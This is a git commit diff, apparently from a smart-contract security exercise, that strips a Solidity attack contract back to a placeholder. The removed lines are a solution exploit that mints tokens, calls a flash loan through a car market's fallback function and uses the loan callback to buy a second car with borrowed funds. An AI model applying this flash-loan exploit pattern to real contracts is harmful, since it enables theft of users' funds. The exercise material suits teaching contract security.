57c266185f7a60c4804ba2c462b4dd47af7a91ad
0xTutturu <tutturutech@gmail.com>
2022-07-18 16:17:58 +0200

    ready for hacking

--- src/attacker/Attack.sol
+++ src/attacker/Attack.sol
@@ -27,25 +27,5 @@ contract Attack {
         _;
     }
 
-    function attack() external onlyOwner {
-        // Mint 1e18 tokens
-        token.mint();
-        // Approve the market for spending
-        token.approve(address(market), 1 ether);
-        // Buy a car
-        market.purchaseCar("tears", "clownmobile", "Cl0Wn");
-
-        // Call flashloan via the CarMarket fallback function
-        bytes memory data = abi.encodeWithSignature(
-            "flashLoan(uint256)",
-            100000 ether
-        );
-        (bool success, ) = address(market).call(data);
-    }
-
-    function receivedCarToken(address factory) external {
-        // Buy another car
-        token.approve(address(market), 100000 ether);
-        market.purchaseCar("REKT", "REKT", "REKT");
-    }
+    // ATTACK FUNCTIONS
 }
